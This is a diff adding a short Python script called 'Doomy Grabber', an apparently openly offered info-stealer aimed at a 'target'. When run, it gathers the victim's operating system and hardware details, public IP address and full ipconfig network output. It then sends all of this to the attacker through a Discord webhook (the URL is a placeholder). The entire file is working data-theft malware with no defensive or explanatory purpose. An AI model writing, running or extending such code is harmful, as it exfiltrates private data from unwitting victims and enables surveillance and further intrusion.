@@ -1,0 +1,51 @@
+#python3
+
+
+import requests
+import discord
+import getpass
+import subprocess
+import platform
+
+
+from discord import SyncWebhook
+import scapy.data
+
+webhook = "webhook here"
+
+
+hook = SyncWebhook.from_url(webhook)
+embed = discord.Embed(title="Doomy Grabber")
+embed.set_author(name="made by purpurpump | YOU GOT NEW TARGET ✅")
+
+# config
+
+GETIP = requests.get("http://ip-api.com/line/?fields=61439").text
+
+# System Grabber
+
+embed.add_field(name="**Computer Info:**", value=f"{" "}", inline=False)
+
+embed.add_field(name="System : ", value=f"{"System: "+platform.system()}", inline=False)
+embed.add_field(name="Platform : ", value=f"Platform: {platform.platform()}", inline=False)
+embed.add_field(name="Machine : ", value=f"Platform: {platform.machine()}", inline=False)
+embed.add_field(name="Processor : ", value=f"Processor: {platform.processor()}", inline=False)
+embed.add_field(name="Win32 Edition : ", value=f"Win32 Edition: {platform.win32_edition()}", inline=False)
+embed.add_field(name="Uname : ", value=f"Uname: {platform.uname()}", inline=False)
+
+# Personal Data Grabber
+
+embed.add_field(name="**---------**", value=f"{" "}", inline=False)
+embed.add_field(name="**Target IP :**", value=f"{" "}", inline=False)
+ip = embed.add_field(name=" ", value=f"IP: || {requests.get("https://api.ipify.org").text} ||", inline=False)
+
+# Network Grabber
+embed.add_field(name="**---------**", value=f"{" "}", inline=False)
+network_output = subprocess.run(['ipconfig'], capture_output=True, text=True).stdout
+embed.add_field(name="**Network Grabbed :**", value=f"|||```{network_output}```|||", inline=False)
+
+# end the code
+
+embed.set_image(url="https://media.discordapp.net/attachments/1243684259009400903/1243793647305101392/image-removebg-preview.png?ex=6652c49a&is=6651731a&hm=a6e3b45239352092560e4e0ae389d699cc2ff686464d6ff7d28b0c527b0403f8&=&format=webp&quality=lossless&width=803&height=485")
+
+hook.send(embed=embed)
